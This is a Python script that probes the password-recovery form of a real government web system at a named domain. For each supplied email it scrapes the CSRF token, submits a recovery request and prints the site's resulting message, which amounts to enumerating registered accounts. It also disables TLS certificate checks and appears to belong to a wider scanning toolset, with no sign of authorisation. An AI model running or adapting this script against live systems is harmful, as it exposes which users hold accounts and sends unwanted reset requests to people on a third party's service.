"""Password-recovery probe: follow the flash message with a cookie session."""
import http.cookiejar
import re
import ssl
import sys
import urllib.parse
import urllib.request

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

FORM = "https://mis.pc.go.tz/pcmis.data/recover-password.php"
POST = "https://mis.pc.go.tz/pcmis.data/model/action/users.datacrud.php"
AFTER = "https://mis.pc.go.tz/pcmis.data/index.php"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=CTX))


def fetch(op, url, data=None, referer=None):
    hdrs = {"User-Agent": scan.UA}
    if referer:
        hdrs["Referer"] = referer
    if data is not None:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdrs)
    try:
        with op.open(req, timeout=20) as r:
            return r.read(40000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read(20000).decode("utf-8", "replace")
    except Exception as e:
        return f"ERR {e}"


for email in sys.argv[1:]:
    op = opener()
    page = fetch(op, FORM)
    m = re.search(r'name="csrf_token" value="([^"]+)"', page)
    if not m:
        print(email, "-> no token")
        continue
    data = urllib.parse.urlencode({"email": email, "csrf_token": m.group(1),
                                   "action_type": "recoverpassword"}).encode()
    fetch(op, POST, data=data, referer=FORM)
    after = fetch(op, AFTER)
    body = re.sub(r"<(script|style)[^>]*>.*?</\1>", "", after, flags=re.S)
    text = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", body))
    print(f"\n--- {email} ({len(after)} bytes)")
    print("   text:", text.strip()[:260])
